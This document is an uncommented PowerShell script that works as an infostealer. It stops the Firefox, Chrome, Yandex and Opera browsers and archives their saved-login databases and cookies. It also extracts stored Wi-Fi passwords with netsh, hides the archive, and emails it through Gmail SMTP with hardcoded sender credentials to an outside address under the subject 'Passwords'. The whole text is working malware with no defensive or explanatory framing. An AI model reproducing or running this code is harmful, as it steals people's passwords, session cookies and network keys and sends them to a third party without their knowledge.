echo "qwe"
$p=$env:TEMP+"\d"+(Get-Random -max 17071707)+".zip"

if(Test-Path -Path "C:\Program Files\WinRAR222\WinRAR.exe")
  {$arh="WinRar"}
elseif(Test-Path -Path "C:\Program Files\7-Zip\7z.exe")
  {Set-Location -Path "C:\Program Files\7-Zip\";$arh="7-Zip"}

$f=($env:APPDATA+"\Mozilla\Firefox\Profiles\*");
if(Test-Path -Path $f)
  {Stop-Process -Name firefox -ErrorAction SilentlyContinue;
  if("WinRAR"-in $arh)
    {Get-ChildItem -Path $f -Include "logins.json","*.db" -Recurse | Compress-Archive -Update -CompressionLevel Fastest -DestinationPath $p}
  elseif("7-Zip" -in $arh)
    {.\7z.exe a $p (Get-ChildItem -Path $f -Include "logins.json","*.db" -Recurse) -spf -tzip}
}
else{echo "Masd"}

$g=($env:LOCALAPPDATA+"\Google\Chrome\User Data\Default\");
if(Test-Path -Path $g){
  Stop-Process -Name chrome -ErrorAction SilentlyContinue;
  if("WinRAR"-in $arh)
    {Get-ChildItem -Path $g -Include "Login Data", "Cookies" -Recurse | Compress-Archive -Update -CompressionLevel Fastest -DestinationPath $p}
  elseif("7-Zip" -in $arh)
    {.\7z.exe a $p ($g+"Login Data") ($g+"Cookies") -spf -tzip}
}
else{echo "Gasd"}

$y=($env:LOCALAPPDATA+"\Yandex\YandexBrowser\User Data\Default\");
if(Test-Path -Path $y){
  Stop-Process -Name browser -ErrorAction SilentlyContinue;
  if("WinRAR" -in $arh)
    {Get-ChildItem -Path $y -Include ("Ya Passman Data"), ("Cookies") -Recurse | Compress-Archive -Update -CompressionLevel Fastest -DestinationPath $p}
  elseif("7-Zip"-in $arh)
    {.\7z.exe a $p ($y+"Ya Passman Data"),($y+"Cookies") -spf -tzip}
}
else{echo "Yasd"}

$o=($env:APPDATA+"\Opera Software\Opera Stable\");
if(Test-Path -Path $o){
  Stop-Process -Name browser -ErrorAction SilentlyContinue;
  if("WinRAR" -in $arh)
    {Get-ChildItem -Path $o -Include ("Login Data"), ("Cookies") -Recurse | Compress-Archive -CompressionLevel Fastest -DestinationPath $p}
  elseif("7-Zip"-in $arh)
    {.\7z.exe a $p ($o+"Login Data"),($o+"Cookies") -spf -tzip}
}
else{echo "Oasd"}


(netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)} | Select-String "Содержимое ключа\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ ESSID=$name;PASS=$pass }} | Format-Table -AutoSize > $env:TEMP\p.txt
$w=$env:TEMP+'\p.txt'
if("WinRAR" -in $arh)
  {Compress-Archive -Path $w -Update -CompressionLevel Fastest -DestinationPath $p}
elseif("7-Zip"-in $arh)
  {.\7z.exe a $p $w -spf -tzip}

attrib +H $p

$SMTPServer="smtp.gmail.com";$SMTPInfo=New-Object Net.Mail.SmtpClient($SmtpServer,587);$SMTPInfo.EnableSsl=$true
$SMTPInfo.Credentials=New-Object System.Net.NetworkCredential("f7swwq@gmail.com","parampam1");$ReportEmail=New-Object System.Net.Mail.MailMessage

$ReportEmail.From="f7swwq@gmail.com";$ReportEmail.To.Add("keklol2045@gmail.com");$ReportEmail.Subject="Passwords"
$s=New-Object Net.Mail.Attachment($p);if("WinRAR"-in $arh){$ReportEmail.Attachments.Add($s)}else{$ReportEmail.Attachments.Add($s)};$SMTPInfo.Send($ReportEmail)

